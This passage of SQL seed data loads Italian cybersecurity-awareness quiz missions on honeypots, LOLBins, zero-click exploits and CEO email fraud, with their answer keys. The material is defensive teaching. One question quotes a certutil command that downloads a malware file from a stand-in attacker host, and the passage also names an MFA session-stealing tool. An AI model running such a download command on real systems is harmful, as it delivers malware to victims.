    E'# Honeypot\n\nUn server che sembra facile da hackerare, pieno di dati interessanti... falsi.\n\nServe a:\n1.  **Rilevare:** Se qualcuno tocca l''honeypot, è sicuramente un nemico (nessun utente legittimo dovrebbe essere lì).\n2.  **Rallentare:** L''hacker perde tempo a rubare file finti.\n3.  **Studiare:** Registriamo ogni comando che digita per capire le sue tecniche (TTPs).',
    'difficile', '15 min', 150, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000012', 'Cos''è una "Canary Token" (o Canarino)?', 'multiple_choice', '["Un uccellino", "Un file (es. Word) che, se aperto, invia silenziosamente una notifica all''amministratore. Serve a scoprire se i dati sono stati rubati", "Una password", "Un miner"]', 1, 'Come il canarino nella miniera: avvisa del pericolo.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000012', 'È legale hackerare chi ti sta hackerando (Hack Back)?', 'multiple_choice', '["Sì, legittima difesa", "No, nella maggior parte dei paesi è illegale. Rischi di attaccare un server innocente usato come proxy dall''hacker", "Solo se sei veloce", "Dipende"]', 1, 'Lascia fare alla polizia. L''Hack Back è rischioso.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000012', 'Un Honeypot mal configurato può essere rischioso?', 'multiple_choice', '["No", "Sì, se l''hacker riesce a ''scappare'' dall''honeypot e usarlo come base per attaccare la vera rete interna", "Solo se è pieno", "No, è virtuale"]', 1, 'L''isolamento dell''honeypot deve essere perfetto.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000012', 'Gli hacker sanno riconoscere gli Honeypot?', 'true_false', '["Vero", "Falso"]', 0, 'Spesso sì. Se un sistema è troppo silenzioso o ha comportamenti standard (default), l''hacker esperto se ne accorge e se ne va.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000012', 'Questa cartella "Password_Admin" aperta a tutti è una trappola?', 'image_true_false', '["Vero", "Falso"]', 0, 'Molto probabile. Nessun admin sano di mente lascerebbe una cartella così pubblica. È un''esca.', 'https://placehold.co/600x400?text=Open+Password+Folder');


-- =================================================================================================
-- NAPOLI (NA) - BOSS FINALE ("Gomorra Cyber") 💀
-- =================================================================================================

-- Mission 1: LOLBins (Living off the Land) - Nightmare
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000013', 'NA', 'LOLBins (Nightmare)',
    'Il nemico usa le tue stesse armi.',
    E'# Living Off The Land Binaries (LOLBins)\n\nL''hacker non scarica "virus.exe".\nUsa programmi GIÀ presenti in Windows (come `certutil.exe`, `bitsadmin.exe`, `powershell.exe`) per compiere azioni malevole.\n\nL''antivirus non li blocca perché sono firmati da Microsoft e necessari al sistema.\nPer rilevarli, serve analizzare il **comportamento** (cosa stanno facendo?), non il file.',
    'difficile', '20 min', 300, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000013', 'Il comando `certutil -urlcache -split -f http://hacker.com/malware.exe` viene bloccato dall''Antivirus classico?', 'multiple_choice', '["Sì, subito", "Spesso NO. CertUtil è un tool legittimo per gestire certificati. L''hacker lo abusa per scaricare file. Questa è la tecnica LOLBin", "Sì, perché è HTTP", "Dipende"]', 1, 'CertUtil è il "downloader" preferito dagli APT.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000013', 'Cos''è il "Fileless Malware"?', 'multiple_choice', '["Un virus senza nome", "Codice malevolo che gira interamente nella RAM (via PowerShell o WMI) senza mai scrivere un file `.exe` sul disco. Riavviando sparisce (spesso), ma è difficilissimo da trovare", "Un bug", "Un fantasma"]', 1, 'Se non c''è file, l''antivirus basato su file signature è cieco.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000013', 'Come ci si difende dai LOLBins?', 'multiple_choice', '["Cancellando System32", "Usando EDR (Endpoint Detection & Response) che monitora la linea di comando e le relazioni parent-child dei processi (es. Word che apre PowerShell)", "Installando due antivirus", "Spegnendo internet"]', 1, 'L''EDR vede "Word ha lanciato PowerShell che ha lanciato una connessione di rete" -> ALLARME.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000013', 'Le Macro di Excel sono considerate LOLBins?', 'true_false', '["Vero", "Falso"]', 0, 'Sì, abusano di una feature legittima di Office per eseguire codice.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000013', 'Questo processo `svchost.exe` è legittimo?', 'image_true_false', '["Vero", "Falso"]', 1, 'Difficile dirlo solo dal nome. `svchost.exe` è il processo più abusato per nascondere malware (DLL Injection). Serve vedere CHI lo ha lanciato e da dove.', 'https://placehold.co/600x400?text=svchost.exe+Analisi');


-- Mission 2: Zero-Click Exploits (Pegasus) - Nightmare
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000014', 'NA', 'Zero-Click (Nightmare)',
    'Non hai cliccato nulla. Sei infetto lo stesso.',
    E'# Zero-Click Exploits\n\nIl mito del "Phishing" dice che devi sbagliare tu (cliccare).\nLe armi cibernetiche avanzate (es. Pegasus NSO) infettano il telefono semplicemente **ricevendo** un messaggio su WhatsApp o iMessage.\n\nIl codice malevolo sfrutta un bug nel modo in cui il telefono *visualizza l''anteprima* o processa l''immagine, ed esegue il codice PRIMA che tu apra la chat.',
    'difficile', '20 min', 300, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000014', 'Qual è la difesa utente contro uno Zero-Click exploit su iOS/Android?', 'multiple_choice', '["Non aprire i messaggi", "Quasi nulla. L''unica difesa è aggiornare il sistema operativo IMMEDIATAMENTE (patching) e usare modalità come ''Lockdown Mode'' (iOS) che riducono la superficie di attacco", "Usare un Nokia 3310", "Usare VPN"]', 1, 'Contro gli Zero-Click, l''utente è impotente. Dipende dal vendor (Apple/Google).', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000014', 'Perché i bug di "Image Parsing" sono così pericolosi?', 'multiple_choice', '["Le immagini sono grandi", "Perché il sistema operativo processa le immagini automaticamente per generare le miniature (thumbnail) APPENA arrivano, senza interazione utente. È il vettore perfetto", "Sono colorate", "A tutti piacciono le foto"]', 1, 'La libreria grafica è la porta di ingresso.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000014', 'Spegnere e riaccendere il telefono rimuove Pegasus?', 'multiple_choice', '["Sì, sempre", "A volte sì (se non ha persistenza), ma l''attaccante può reinfettarti inviando un altro messaggio invisibile 5 minuti dopo", "No, mai", "Solo se togli la SIM"]', 1, 'La persistenza su mobile moderno è difficile, ma la reinfezione è facile.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000014', 'Usare Signal/Telegram protegge dagli Zero-Click?', 'true_false', '["Vero", "Falso"]', 1, 'Falso. Se la vulnerabilità è nel sistema operativo (es. libreria font o immagini), l''App è irrilevante.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000014', 'La modalità "Lockdown" (iOS) blocca gli allegati nei messaggi?', 'image_true_false', '["Vero", "Falso"]', 0, 'Sì, blocca la maggior parte degli allegati, link preview e tecnologie web complesse per ridurre la superficie di attacco Zero-Click.', 'https://placehold.co/600x400?text=Lockdown+Mode+Enabled');


-- Mission 3: BEC & Silent Watcher - Nightmare
INSERT INTO public.missions (id, province_id, title, description, content, level, estimated_time, nc_reward, tier, region, created_at)
VALUES (
    'ca000001-e1e1-4c5c-9c9c-000000000015', 'NA', 'Il Capo Impostore (BEC)',
    'L''hacker è seduto invisibile alla scrivania del CEO.',
    E'# Business Email Compromise (BEC)\n\nL''hacker ha rubato la password dell''email del CEO mesi fa.\nNon ha fatto nulla.\nHa letto. Ha imparato come il CEO saluta, come firma, chi paga le fatture.\n\nOggi, venerdì alle 17:00, l''hacker (dalla VERA mail del CEO) scrive al contabile: "Mario, serve pagare questo fornitore urgente prima del weekend".\nIl contabile paga. I soldi sono persi.',
    'difficile', '20 min', 300, 'level_3', 'Campania', NOW()
) ON CONFLICT (id) DO UPDATE SET title=EXCLUDED.title, content=EXCLUDED.content, nc_reward=EXCLUDED.nc_reward, level=EXCLUDED.level;

INSERT INTO public.mission_questions (mission_id, text, type, options, correct_answer, explanation, image_url) VALUES
('ca000001-e1e1-4c5c-9c9c-000000000015', 'Come scopri che la mail del CEO è compromessa se l''indirizzo è quello vero?', 'multiple_choice', '["Dalla firma", "Non puoi tecnicamente. L''unica difesa è procedurale: verificare ogni pagamento urgente con una chiamata vocale (Out-of-Band) al CEO", "Dall''antivirus", "Dall''orario"]', 1, 'Se l''account è genuino, SPF/DKIM/DMARC sono validi. Anche l''AI fatica. Serve il telefono.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000015', 'Cos''è una "Inbox Rule" malevola?', 'multiple_choice', '["Una regola per colorare le mail", "Una regola creata dall''hacker che sposta automaticamente le risposte della banca nella cartella ''Cestino'' o ''RSS'', per agire indisturbato senza che la vittima veda gli allarmi", "Una legge", "Un filtro spam"]', 1, 'Controllo standard post-breach: verificare le regole di inoltro/spostamento.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000015', 'L''attacco "Reply-Chain Hijacking" è credibile?', 'multiple_choice', '["Sì", "Moltissimo. L''hacker si inserisce in una conversazione VERA già esistente tra colleghi, allegando un file malevolo come ''aggiornamento''. La fiducia è massima", "No", "Solo il lunedì"]', 1, 'Sfrutta il contesto di fiducia preesistente.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000015', 'Se abiliti la MFA, il BEC è impossibile.', 'true_false', '["Vero", "Falso"]', 1, 'Falso. Esistono strumenti (Evilginx) che rubano anche il token di sessione MFA (AiTM), o l''account potrebbe essere stato compromesso via Legacy Protocols.', NULL),
('ca000001-e1e1-4c5c-9c9c-000000000015', 'Questa fattura ha un IBAN diverso dal solito. Procedo?', 'image_true_false', '["Vero", "Falso"]', 1, 'Fermi tutti! Qualsiasi cambio di IBAN comunicato via mail va verificato vocalmente. È il segnale n.1 di frode.', 'https://placehold.co/600x400?text=IBAN+Change+Request');
